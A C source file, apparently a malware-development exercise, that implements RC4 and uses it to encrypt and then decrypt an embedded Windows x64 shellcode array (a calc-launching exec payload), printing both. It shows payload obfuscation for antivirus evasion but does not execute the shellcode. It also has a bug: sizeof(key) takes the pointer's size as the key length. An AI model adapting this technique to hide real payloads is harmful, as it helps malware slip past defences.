#include <stdio.h>
#include <windows.h>

typedef struct
{
	unsigned int i;
	unsigned int j;
	unsigned char s[256];

} Rc4Context;

int rc4Init(Rc4Context *context, const unsigned char *key, size_t key_length)
{
	// Initializing i for the loops, this has nothing to do with the member i in the struct
	unsigned int i;

	// Initializing j for the loops, this has nothing to do with the member j in the struct
	unsigned int j;

	// Just a simple temporary variable that helps us swap values at the end of this function
	unsigned char temp;

	// Check parameters
	if (context == NULL || key == NULL)
		return ERROR_INVALID_PARAMETER;

	// Clear context
	context->i = 0;
	context->j = 0;

	// Initialize the S array with identity permutation
	for (i = 0; i < 256; i++)
	{
		// My values in each index of the char array are gonna be i for each iteration
		context->s[i] = i;
	}

	// S is then processed for 256 iterations
	for (i = 0, j = 0; i < 256; i++)
	{
		// Randomize the permutations using the supplied key
		j = (j + context->s[i] + key[i % key_length]) % 256;

		// Swap the values of S[i] and S[j]
		temp = context->s[i];
		context->s[i] = context->s[j];
		context->s[j] = temp;
	}

	return 0;
}

void rc4Cipher(Rc4Context *context, const unsigned char *input, unsigned char *output, size_t payload_length)
{

	unsigned char temp;

	// Assigning the members of the struct to a variable
	unsigned int i = context->i;
	unsigned int j = context->j;
	unsigned char *s = context->s;

	// Encryption loop
	while (payload_length > 0)
	{
		// Adjust indices
		i = (i + 1) % 256;
		j = (j + s[i]) % 256;

		// Swap the values of S[i] and S[j]
		temp = s[i];
		s[i] = s[j];
		s[j] = temp;

		// Valid input and output?
		if (input != NULL && output != NULL)
		{
			// XOR the input data with the RC4 stream
			*output = *input ^ s[(s[i] + s[j]) % 256];

			// Increment data pointers
			input++;
			output++;
		}

		// Remaining bytes to process
		payload_length--;
	}

	// Save context
	context->i = i;
	context->j = j;
}

int main()
{

	// Payload
	unsigned char payload[] = {
		0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
		0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
		0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
		0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
		0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
		0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
		0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
		0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
		0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
		0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
		0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
		0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
		0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
		0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
		0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
		0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
		0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
		0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
		0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
		0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
		0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
		0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
		0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00};

	// Intializes all members of the struct to 0
	Rc4Context ctx;

	// Buffer where we are going to store the encrypted payload
	unsigned char encrypted_payload[sizeof(payload)];

	// Key used for encryption that stores in a char pointer type, we tell the code to treat the string as a pointer
	unsigned char *key = (unsigned char *)"maldev123";

	// Call the rc4Init function and pass 3 parameters
	rc4Init(&ctx, key, sizeof(key));

	// Call the rc4Cipher function to encrypt the payload
	rc4Cipher(&ctx, payload, encrypted_payload, sizeof(payload));

	// Print the encrypted payload
	printf("The encrypted payload is: \n");

	for (size_t i = 0; i < sizeof(payload); i++)
	{
		printf("0x%02X, ", encrypted_payload[i]);

		if ((i + 1) % 12 == 0)
		{
			printf("\n");
		}
	}

	unsigned char decrypted_payload[sizeof(encrypted_payload)];

	rc4Init(&ctx, key, sizeof(key));

	// Decryption
	// encrypted_payload - The payload to be decrypted
	// decrypted_payload - A buffer where we are going to store our decrypted payload
	rc4Cipher(&ctx, encrypted_payload, decrypted_payload, sizeof(encrypted_payload));

	printf("\n\nThe decrypted payload is: \n");

	for (size_t i = 0; i < sizeof(encrypted_payload); i++)
	{
		printf("0x%02X, ", decrypted_payload[i]);

		if ((i + 1) % 12 == 0)
		{
			printf("\n");
		}
	}
}
